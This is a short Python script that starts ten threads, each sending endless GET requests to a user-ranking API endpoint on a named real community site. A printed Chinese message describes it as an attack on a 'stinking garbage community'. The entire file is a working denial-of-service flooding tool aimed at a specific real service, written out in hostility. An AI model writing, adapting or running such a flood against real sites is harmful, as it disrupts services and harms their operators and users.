import threading
import requests

print("正在攻击恶臭的垃圾社区")

def send_requests():
    while True:
        requests.get("https://api.sharecuts.cn/users/ranked/by/download?limit=250&offset=0")

threads = []
for i in range(10):
    t = threading.Thread(target=send_requests)
    t.start()
    threads.append(t)
